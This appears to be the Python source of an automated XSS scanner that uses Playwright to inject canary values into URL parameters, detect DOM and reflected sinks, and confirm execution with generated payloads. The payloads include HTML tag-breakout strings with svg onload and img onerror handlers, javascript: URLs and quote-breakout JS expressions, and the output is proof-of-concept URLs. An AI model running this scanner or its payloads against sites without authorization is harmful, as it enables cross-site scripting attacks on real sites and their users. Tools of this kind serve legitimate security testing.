from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
import re
import threading
from lxml import html as lxml_html
import argparse
from queue import Queue
import sys
import yaml

config = yaml.safe_load(open('config.yaml'))
preloadjs = ""
injectjs = ""
stage1_wait = 0

import hashlib
import time

WORKER_TIMEOUT = 60  # seconds
BROWSER_REFRESH_INTERVAL = 20  # URLs per browser before recycle
worker_state = {}  # wid -> {'last': float, 'browser': Browser}
worker_state_lock = threading.Lock()

domain_sinks = {}
domain_sinks_lock = threading.Lock()

domain_reflected = {}
domain_reflected_lock = threading.Lock()

DOMAIN_MAX_ERRORS = 10
domain_errors = {}
domain_errors_lock = threading.Lock()

output_file = None
output_lock = threading.Lock()
debug_mode = False
dedup = False


def is_closed_error(e):
    msg = str(e)
    return ('has been closed' in msg
            or 'Target closed' in msg
            or 'Browser closed' in msg
            or 'Connection closed' in msg)


def domain_is_blocked(domain):
    with domain_errors_lock:
        return domain_errors.get(domain, 0) >= DOMAIN_MAX_ERRORS


def domain_record_error(domain):
    with domain_errors_lock:
        domain_errors[domain] = domain_errors.get(domain, 0) + 1
        return domain_errors[domain]


def filter_new_sinks(domain, sinks, current_url=''):
    """Return only sinks not yet seen for this domain. Hashes sink+sources+code,
    with the current URL (raw and URL-encoded) stripped from code first."""
    if not sinks:
        return []
    if not dedup:
        return list(sinks)
    new = []
    url_enc = quote(current_url, safe='') if current_url else ''
    with domain_sinks_lock:
        seen = domain_sinks.setdefault(domain, set())
        for s in sinks:
            code = s.get('code') or ''
            if current_url:
                code = code.replace(current_url, '').replace(url_enc, '')
            payload = s.get('sink', '') + '|' + ','.join(sorted(s.get('sources', []))) + '|' + code
            h = hashlib.md5(payload.encode('utf-8', 'replace')).hexdigest()
            if h not in seen:
                seen.add(h)
                new.append(s)
    return new

def filter_new_reflected(domain, reflected):
    """Return only reflected hits not yet seen for this domain. Hashes
    key+context+tag+attr."""
    if not reflected:
        return []
    if not dedup:
        return list(reflected)
    new = []
    with domain_reflected_lock:
        seen = domain_reflected.setdefault(domain, set())
        for r in reflected:
            keys = r.get('key', '')
            if isinstance(keys, list):
                keys = ','.join(sorted(keys))
            payload = '|'.join([
                keys,
                r.get('context', ''),
                r.get('tag', ''),
                r.get('attr', ''),
            ])
            h = hashlib.md5(payload.encode('utf-8', 'replace')).hexdigest()
            if h not in seen:
                seen.add(h)
                new.append(r)
    return new


def find_reflected_canaries(raw_html, canary):
    results = []
    rgx = re.compile(canary + r'([a-zA-Z0-9_.\[\]\-]+)')
    tree = lxml_html.fromstring(raw_html)

    def _snippet(element):
        try:
            s = lxml_html.tostring(element, encoding='unicode', with_tail=False)
        except Exception:
            return ''
        s = re.sub(r'\s+', ' ', s).strip()
        return s[:300]

    for el in tree.iter():
        tag = el.tag if isinstance(el.tag, str) else ''

        # tag name itself matches canary — `<canary+key>` was reflected
        # unescaped into HTML body and parsed as an unknown empty element.
        keys = list(dict.fromkeys(m.group(1) for m in rgx.finditer(tag)))
        if keys:
            parent = el.getparent()
            parent_tag = parent.tag if (parent is not None and isinstance(parent.tag, str)) else 'html'
            results.append({'key': keys, 'context': 'html', 'tag': parent_tag,
                            'code': _snippet(parent if parent is not None else el)})

        # check text and tail
        for text in (el.text, el.tail):
            if not text:
                continue
            keys = list(dict.fromkeys(m.group(1) for m in rgx.finditer(text)))
            if keys:
                ctx = 'script' if tag == 'script' else 'style' if tag == 'style' else 'html'
                results.append({'key': keys, 'context': ctx, 'tag': tag, 'code': _snippet(el)})

        # check attributes
        for attr_name, attr_val in el.attrib.items():
            if not attr_val:
                continue
            keys = list(dict.fromkeys(m.group(1) for m in rgx.finditer(attr_val)))
            if keys:
                results.append({'key': keys, 'context': 'attr', 'tag': tag, 'attr': attr_name, 'code': _snippet(el)})

    return results


def get_reflected_payloads(reflected, canary):
    """Generate confirmation payloads for server-side reflected canaries.
    One universal HTML-breakout payload per unique key — the tag-eating prefix
    handles script/style/title/textarea/attribute contexts, so we don't need
    to branch on the detected context for confirmation."""
    seen = set()
    results = []
    for r in reflected:
        keys = r.get('key') or []
        if isinstance(keys, str):
            keys = [keys]
        ctx = r.get('context', 'html')
        for key in keys:
            if not key or key in seen:
                continue
            seen.add(key)
            payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg/onload=\"rsjsstorage.alertfunc('{key}')\">"
            results.append({'key': key, 'sink': 'reflected_' + ctx, 'ctx': 'html', 'payload': payload})
    return results


def build_dom_url(current_url, usp_revealed, canary):
    """Append revealed USP keys (not already present in the query) to the
    current URL as `key=canary+key` pairs."""
    if not usp_revealed:
        return current_url
    parsed = urlparse(current_url)
    existing = set(parse_qs(parsed.query, keep_blank_values=True).keys())
    extra = [(k, canary + k) for k in usp_revealed if k not in existing]
    if not extra:
        return current_url
    extra_query = urlencode(extra)
    new_query = parsed.query + '&' + extra_query if parsed.query else extra_query
    return urlunparse(parsed._replace(query=new_query))


JS_SINKS = {'eval', 'func', 'setTimeout', 'setInterval', 'script_text'}
URL_SINKS = {'location_assign', 'location_replace', 'location_href', 'location_nav', 'a_href', 'form_action', 'iframe_src', 'script_src', 'window_open'}
HTML_SINKS = {'html'}

JS_PAYLOADS = {
    'expr':     "rsjsstorage.alertfunc('{key}');",
    'single':   "'-rsjsstorage.alertfunc(\"{key}\")-'",
    'double':   "\"-rsjsstorage.alertfunc('{key}')-\"",
    'backtick': "`-rsjsstorage.alertfunc('{key}')-`",
}


def detect_js_context(code, canary, key):
    """Determine if canary+key sits inside a string literal in JS code.
    Counts unescaped quotes before the marker — odd count means we're inside.
    Returns: 'expr' | 'single' | 'double' | 'backtick'
    """
    marker = canary + key
    idx = code.find(marker)
    if idx == -1:
        return 'expr'
    before = code[:idx]
    for qchar, name in (('"', 'double'), ("'", 'single'), ('`', 'backtick')):
        count = 0
        i = 0
        while i < len(before):
            if before[i] == '\\':
                i += 2
                continue
            if before[i] == qchar:
                count += 1
            i += 1
        if count % 2 == 1:
            return name
    return 'expr'


def is_url_exploitable(code, canary, key):
    """Check if canary+key controls the full URL or the domain part.
    Returns True if code starts with canary+key, or canary is in the
    netloc of a parsed URL in code."""
    marker = canary + key
    stripped = code.lstrip().lstrip('<')
    if stripped.startswith(marker):
        return True
    try:
        parsed = urlparse(stripped)
        if parsed.netloc and canary in parsed.netloc:
            return True
    except Exception:
        pass
    return False


URL_ATTR_NAMES = ('href', 'src', 'action', 'formaction')


def static_confirm_url_sinks(new_sinks, payloads, canary):
    """For URL sinks where canary+key controls the URL value (start or netloc),
    return the matching payload entries so they can be marked confirmed without
    waiting on stage 2 (which can't auto-click <a>/<form>)."""
    confirmed = []
    for s in new_sinks:
        stype = s['sink']
        is_url_sink = stype in URL_SINKS
        is_url_attr = False
        if stype.startswith('setAttribute_'):
            parts = stype.split('_', 2)
            attr = parts[2] if len(parts) > 2 else ''
            is_url_attr = attr in URL_ATTR_NAMES
        if not (is_url_sink or is_url_attr):
            continue
        code = s.get('code', '')
        for key in s.get('sources', []):
            if not is_url_exploitable(code, canary, key):
                continue
            for p in payloads:
                if p['key'] == key and p['sink'] == stype:
                    confirmed.append(p)
                    break
    return confirmed


def get_payloads(sink, canary):
    """Generate payloads for a sink entry. Returns list of dicts with
    key, sink, ctx, payload."""
    stype = sink['sink']
    code = sink.get('code', '')
    results = []

    for key in sink.get('sources', []):
        if stype in JS_SINKS:
            ctx = detect_js_context(code, canary, key)
            payload = JS_PAYLOADS[ctx].format(key=key)
            results.append({'key': key, 'sink': stype, 'ctx': ctx, 'payload': payload})

        elif stype in URL_SINKS:
            results.append({'key': key, 'sink': stype, 'ctx': 'url',
                            'payload': f"javascript:rsjsstorage.alertfunc('{key}')"})

        elif stype in HTML_SINKS:
            results.append({'key': key, 'sink': stype, 'ctx': 'html',
                            'payload': f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><img/src/onerror=\"rsjsstorage.alertfunc('{key}')\">"})

        elif stype.startswith('setAttribute_'):
            # format: setAttribute_<tag>_<attr>
            parts = stype.split('_', 2)
            attr = parts[2] if len(parts) > 2 else ''
            if attr.startswith('on'):
                results.append({'key': key, 'sink': stype, 'ctx': 'event',
                                'payload': f"rsjsstorage.alertfunc('{key}')"})
            elif attr in ('href', 'src', 'action', 'formaction'):
                results.append({'key': key, 'sink': stype, 'ctx': 'url',
                                'payload': f"javascript:rsjsstorage.alertfunc('{key}')"})

    return results


def build_inject_js(payloads):
    """Build preload_inject.js with payload_map {key: payload} filled in.
    _hash key is separated into hash_payload."""
    import json
    payload_map = {}
    hash_payload = ''
    for p in payloads:
        if p['key'] == '_hash':
            hash_payload = p['payload']
        else:
            payload_map[p['key']] = p['payload']
    js = injectjs
    js = js.replace('"{{payload_map}}"', json.dumps(payload_map))
    js = js.replace('"{{hash_payload}}"', json.dumps(hash_payload))
    return js


def build_payload_url(base_url, key, payload):
    """Build a PoC URL with `payload` substituted as the value of `key`.
    For key == '_hash', strips any existing fragment and appends `#<payload>` raw."""
    if key == '_hash':
        return base_url.split('#', 1)[0] + '#' + payload
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[key] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def emit_confirmed(base_url, confirmed):
    """Print confirmed PoC URLs to stdout, and append to output_file if set."""
    for c in confirmed:
        payload = c['payload'].replace('rsjsstorage.alertfunc', 'alert')
        poc = build_payload_url(base_url, c['key'], payload)
        line = f"{poc}  [sink={c['sink']} ctx={c['ctx']}]"
        print(line)
        if output_file is not None:
            with output_lock:
                output_file.write(line + '\n')


def process_url_stage2(context, url, payloads):
    """Stage 2: reload the same URL with canary params, but preload_inject.js
    returns payload values via USP hooks and hash."""
    if not payloads:
        return []
    inject_script = build_inject_js(payloads)
    url = inject_canary_params(url, config['canary'])
    has_hash_payload = any(p['key'] == '_hash' for p in payloads)
    target_url = url if has_hash_payload else url + f"#{config['canary']}_hash"

    page = context.new_page()
    page.add_init_script(script=inject_script)

    def stage2_route(route, request):
        try:
            if request.resource_type in BLOCKED_RESOURCE_TYPES:
                route.abort()
                return
        except Exception:
            pass
        try:
            route.continue_()
        except Exception:
            pass

    page.route("**/*", stage2_route)
    try:
        try:
            page.goto(target_url, timeout=10000, wait_until='commit')
        except PlaywrightTimeoutError:
            pass
        expected = len(payloads)
        try:
            page.wait_for_function(
                f"() => window.rsjsstorage && window.rsjsstorage.jsEvals.length >= {expected}",
                timeout=1500,
            )
        except PlaywrightTimeoutError:
            pass
        js_evals = page.evaluate("() => window.rsjsstorage ? window.rsjsstorage.jsEvals : null")
        confirmed = [p for p in payloads if p['key'] in (js_evals or [])]
        return confirmed
    except Exception as e:
        if is_closed_error(e):
            raise
        print(f"[stage2 error] {target_url} {e}", file=sys.stderr)
        return []
    finally:
        try:
            page.close()
        except Exception:
            pass


def process_url_stage2_reflected(context, base_url, payloads):
    """Confirm server-side reflected XSS by navigating with the payload as the
    raw query value (no JS hooks — the server has to be doing the reflection
    for execution to fire). Returns payloads whose key landed in jsEvals."""
    if not payloads:
        return []
    confirmed = []
    for p in payloads:
        target_url = build_payload_url(base_url, p['key'], p['payload'])
        try:
            page = context.new_page()
        except Exception as e:
            if is_closed_error(e):
                raise
            print(f"[stage2-reflected new_page] {target_url} {e}", file=sys.stderr)
            continue

        def stage2_route(route, request):
            try:
                if request.resource_type in BLOCKED_RESOURCE_TYPES:
                    route.abort()
                    return
            except Exception:
                pass
            try:
                route.continue_()
            except Exception:
                pass

        page.route("**/*", stage2_route)
        try:
            try:
                page.goto(target_url, timeout=10000, wait_until='commit')
            except PlaywrightTimeoutError:
                pass
            try:
                page.wait_for_function(
                    "(k) => window.rsjsstorage && window.rsjsstorage.jsEvals.includes(k)",
                    arg=p['key'],
                    timeout=1500,
                )
            except PlaywrightTimeoutError:
                pass
            js_evals = page.evaluate("() => window.rsjsstorage ? window.rsjsstorage.jsEvals : null") or []
            if p['key'] in js_evals:
                confirmed.append(p)
        except Exception as e:
            if is_closed_error(e):
                raise
            print(f"[stage2-reflected error] {target_url} {e}", file=sys.stderr)
        finally:
            try:
                page.close()
            except Exception:
                pass
    return confirmed


def inject_canary_params(url, canary):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if params:
        # `<` + canary + key + `>` — matches rsCanaryValue() in preload.js so
        # jQuery's HTML-vs-text heuristic routes the value through innerHTML.
        injected = {k: ["<" + canary + k + ">"] for k in params}
        new_query = urlencode(injected, doseq=True)
        url = urlunparse(parsed._replace(query=new_query))
    return url


BLOCKED_RESOURCE_TYPES = {'image', 'media', 'font'}


def process_url(context, url):
        url_domain = urlparse(url).netloc
        if domain_is_blocked(url_domain):
            return
        try:
            page = context.new_page()
        except Exception as e:
            if is_closed_error(e):
                raise
            print(f"[{url_domain}] new_page: {e}", file=sys.stderr)
            return

        try:
            url = inject_canary_params(url, config['canary'])
            raw_body = []
            target_url = url + f"#{config['canary']}_hash"

            def capture_response(response):
                # capture the main document response body
                if response.url.split('#')[0] == url and 'text/html' in (response.headers.get('content-type', '')):
                    try:
                        raw_body.append(response.text())
                    except Exception:
                        pass

            page.on("response", capture_response)

            # Capture canary-containing navigations at the network layer.
            # In Chromium, Location.{assign,replace,href} cannot be hooked from
            # JS (own non-configurable props on the location instance), so we
            # intercept here. The initial goto is allowed; any later main-frame
            # nav whose URL contains the canary is recorded as `location_nav`
            # and fulfilled with HTTP 204 — that keeps the browser on the
            # current page and preserves rsjsstorage (route.abort() instead
            # lands on chrome-error://chromewebdata/ and wipes it).
            target_url_no_hash = target_url.split('#', 1)[0]
            nav_sinks = []
            canary = config['canary']
            src_rgx = re.compile(canary + r'([a-zA-Z0-9_.\[\]\-]+)')

            def nav_route(route, request):
                try:
                    if request.resource_type in BLOCKED_RESOURCE_TYPES:
                        route.abort()
                        return
                    if (request.is_navigation_request()
                            and request.frame == page.main_frame
                            and request.url.split('#', 1)[0] != target_url_no_hash
                            and canary in request.url):
                        keys = list(dict.fromkeys(src_rgx.findall(request.url)))
                        nav_sinks.append({'sink': 'location_nav', 'sources': keys, 'code': request.url})
                        route.fulfill(status=204, body='')
                        return
                except Exception:
                    pass
                try:
                    route.continue_()
                except Exception:
                    pass

            page.route("**/*", nav_route)
            # Listen for all console logs
            # page.on("console", lambda msg: print(msg.text))
            try:
                page.goto(target_url, timeout=10000, wait_until='commit')
            except PlaywrightTimeoutError:
                pass
            # Post-commit settle: 'load' and 'domcontentloaded' never fire on
            # pages where the IIFE triggers a canary nav that we 204; waiting
            # on them costs the full timeout. networkidle is safer because the
            # 204 closes the request stream. Use stage1_wait when set,
            # otherwise a short 300 ms window for inline JS to run.
            if stage1_wait:
                try:
                    page.wait_for_load_state('networkidle', timeout=int(stage1_wait * 1000))
                except Exception:
                    pass
            else:
                page.wait_for_timeout(300)
            rsjsstorage = page.evaluate("""() => {
                return window.rsjsstorage
            }""")

            if not rsjsstorage:
                print(f"[{url_domain}] no rsjsstorage (preload didn't run; page at {page.url})", file=sys.stderr)
                return

            current_url = rsjsstorage['originurl']
            domain = urlparse(current_url).netloc
            rsjsstorage['dom_url'] = build_dom_url(current_url, rsjsstorage.get('uspRevealed') or [], config['canary'])

            # check raw response for reflected canary with context
            new_reflected = []
            if raw_body:
                reflected = find_reflected_canaries(raw_body[0], config['canary'])
                new_reflected = filter_new_reflected(domain, reflected)
                if new_reflected:
                    rsjsstorage['reflected'] = new_reflected

            merged_sinks = (rsjsstorage.get('sinks') or []) + nav_sinks
            new_sinks = filter_new_sinks(domain, merged_sinks, current_url)

            # Stage 2: generate payloads and verify execution
            payloads = []
            for s in new_sinks:
                payloads.extend(get_payloads(s, config['canary']))
            confirmed = []
            if payloads:
                static_confirmed = static_confirm_url_sinks(new_sinks, payloads, config['canary'])
                stage2_confirmed = process_url_stage2(context, url, payloads)
                seen = set()
                for p in static_confirmed + stage2_confirmed:
                    k = (p['key'], p['sink'])
                    if k not in seen:
                        seen.add(k)
                        confirmed.append(p)

            # Stage 2 (reflected): server-side reflected XSS — navigate with
            # payload directly in the query and check for alertfunc execution.
            reflected_payloads = get_reflected_payloads(new_reflected, config['canary'])
            if reflected_payloads:
                # Skip keys already confirmed via a DOM sink — same PoC URL.
                confirmed_keys = {(c['key'], c['sink']) for c in confirmed}
                reflected_payloads = [p for p in reflected_payloads
                                      if not any(p['key'] == k[0] for k in confirmed_keys)]
                if reflected_payloads:
                    for p in process_url_stage2_reflected(context, url, reflected_payloads):
                        confirmed.append(p)

            if confirmed:
                emit_confirmed(rsjsstorage['dom_url'], confirmed)

            if debug_mode and (new_sinks or rsjsstorage.get('reflected')):
                print({'originurl': rsjsstorage.get('originurl'), 'dom_url': rsjsstorage.get('dom_url'), 'uspRevealed': rsjsstorage.get('uspRevealed'), 'sinks': new_sinks, 'confirmed': confirmed, 'reflected': rsjsstorage.get('reflected')}, file=sys.stderr)

        except Exception as r:
            if is_closed_error(r):
                raise
            count = domain_record_error(url_domain)
            print(f"[{url_domain} err {count}/{DOMAIN_MAX_ERRORS}] {r}", file=sys.stderr)
        finally:
            try:
                page.close()
            except Exception:
                pass


def worker(wid, queue: Queue, done_event: threading.Event):
    with worker_state_lock:
        worker_state.setdefault(wid, {'last': time.time(), 'browser': None})
    try:
        with sync_playwright() as p:
            def launch_browser():
                browser = p.chromium.launch(args=[
                    '--js-flags=--max-old-space-size=500',
                    # '--disable-dev-shm-usage',
                    # '--disable-features=site-per-process,IsolateOrigins',
                    # '--disable-gpu',
                    # '--disable-software-rasterizer',
                    # '--disable-accelerated-2d-canvas',
                    # '--in-process-gpu',
                ])
                context = browser.new_context(
                    bypass_csp=True,
                    user_agent=config['ua'],
                    ignore_https_errors=True,
                )
                context.add_init_script(script=preloadjs)
                return browser, context

            browser, context = launch_browser()
            with worker_state_lock:
                worker_state[wid] = {'last': time.time(), 'browser': browser}
            processed = 0
            while True:
                try:
                    url = queue.get(timeout=1)
                except Exception:
                    if done_event.is_set() and queue.empty():
                        break
                    continue
                with worker_state_lock:
                    if wid in worker_state:
                        worker_state[wid]['last'] = time.time()
                        worker_state[wid]['url'] = url
                try:
                    process_url(context, url)
                except Exception as e:
                    if is_closed_error(e):
                        print(f"[worker {wid}] browser/context closed on {url}, exiting for respawn", file=sys.stderr)
                        break
                    print(f"[worker {wid}] process_url: {e}", file=sys.stderr)
                with worker_state_lock:
                    if wid in worker_state:
                        worker_state[wid]['url'] = None
                processed += 1
                if processed >= BROWSER_REFRESH_INTERVAL:
                    print(f"[worker {wid}] recycling browser after {processed} URLs", file=sys.stderr)
                    try:
                        browser.close()
                    except Exception:
                        pass
                    try:
                        browser, context = launch_browser()
                    except Exception as e:
                        print(f"[worker {wid}] relaunch failed: {e}", file=sys.stderr)
                        break
                    with worker_state_lock:
                        if wid in worker_state:
                            worker_state[wid]['browser'] = browser
                            worker_state[wid]['last'] = time.time()
                    processed = 0
                    continue
                try:
                    context.clear_cookies()
                except Exception as e:
                    if is_closed_error(e):
                        print(f"[worker {wid}] context closed after {url}, exiting for respawn", file=sys.stderr)
                        break
            try:
                browser.close()
            except Exception:
                pass
    except Exception as e:
        print(f"[worker {wid}] died: {e}", file=sys.stderr)
    finally:
        with worker_state_lock:
            worker_state.pop(wid, None)


def watchdog(queue, next_wid_holder, target_workers, stop_event, done_event):
    """Kill hung workers, top up to target_workers when any worker died on its own."""
    def spawn_worker():
        new_wid = next_wid_holder[0]
        next_wid_holder[0] += 1
        with worker_state_lock:
            worker_state[new_wid] = {'last': time.time(), 'browser': None}
        t = threading.Thread(target=worker, args=(new_wid, queue, done_event), daemon=True)
        t.start()

    while not stop_event.is_set():
        time.sleep(5)
        now = time.time()
        stuck = []
        with worker_state_lock:
            for wid, st in list(worker_state.items()):
                if now - st['last'] > WORKER_TIMEOUT:
                    stuck.append((wid, st['browser'], st.get('url')))
                    worker_state.pop(wid, None)
        for wid, br, hung_url in stuck:
            if hung_url:
                d = urlparse(hung_url).netloc
                count = domain_record_error(d)
                print(f"[watchdog] worker {wid} hung > {WORKER_TIMEOUT}s on {hung_url} [{d} err {count}/{DOMAIN_MAX_ERRORS}], killing browser", file=sys.stderr)
            else:
                print(f"[watchdog] worker {wid} hung > {WORKER_TIMEOUT}s (idle), killing browser", file=sys.stderr)
            try:
                if br is not None:
                    br.close()
            except Exception:
                pass
            spawn_worker()
        # Top up workers that died on their own (e.g. browser crash, OOM, exception).
        # Skip when work is drained — those workers exited normally.
        work_remaining = not (done_event.is_set() and queue.empty())
        if work_remaining:
            with worker_state_lock:
                deficit = target_workers - len(worker_state)
            for _ in range(max(0, deficit)):
                print(f"[watchdog] worker died unexpectedly, spawning replacement", file=sys.stderr)
                spawn_worker()
        # exit only after stdin/file is fully ingested AND queue drained AND no workers left
        if done_event.is_set() and queue.empty():
            with worker_state_lock:
                if not worker_state:
                    return


def main():
    global preloadjs, injectjs, stage1_wait, output_file, debug_mode, dedup
    preloadjs = getPreloadJS()
    injectjs = getInjectJS()
    with open("js/preload_debug.js", "w") as f:
        f.write(preloadjs)

    parser = argparse.ArgumentParser(description="Process URLs with DOMScan.")
    parser.add_argument('-u','--urls', help="File containing URLs to process")
    parser.add_argument('-t','--threads', type=int, default=10, help="Maximum number of threads to use")
    parser.add_argument('-w','--wait', type=float, default=0, help="Seconds to wait after page load on stage 1")
    parser.add_argument('-o','--output', help="File to write confirmed findings to (truncated on open)")
    parser.add_argument('-d','--debug', action='store_true', help="Print unconfirmed sinks and reflected hits to stdout")
    parser.add_argument('-D','--dedup', action='store_true', help="Enable per-domain sink/reflected deduplication")
    args = parser.parse_args()
    stage1_wait = args.wait
    debug_mode = args.debug
    dedup = args.dedup
    if args.output:
        output_file = open(args.output, 'w', buffering=1)

    queue = Queue()
    done_event = threading.Event()

    if args.urls:
        with open(args.urls, 'r') as file:
            for url in file:
                queue.put(url.strip())
        done_event.set()

    next_wid_holder = [args.threads]
    for i in range(args.threads):
        t = threading.Thread(target=worker, args=(i, queue, done_event), daemon=True)
        t.start()

    stop_event = threading.Event()
    wd = threading.Thread(target=watchdog, args=(queue, next_wid_holder, args.threads, stop_event, done_event), daemon=True)
    wd.start()

    if not args.urls:
        for url in sys.stdin:
            url = url.strip()
            if url:
                queue.put(url)
        done_event.set()

    wd.join()
    stop_event.set()

def getInjectJS():
    with open('js/preload_inject.js', 'r') as f:
        return f.read()


def getPreloadJS():
    preload_script = config.get('preload_script', None)
    with open(preload_script, 'r') as f:
        preload_jscontent = f.read()

    preload_jscontent = preload_jscontent.replace("{{canary}}", config['canary'])
    preload_jscontent = preload_jscontent.replace('"{{topparams}}"', str(config['topparams']))

    return preload_jscontent

if __name__ == "__main__":
    main()
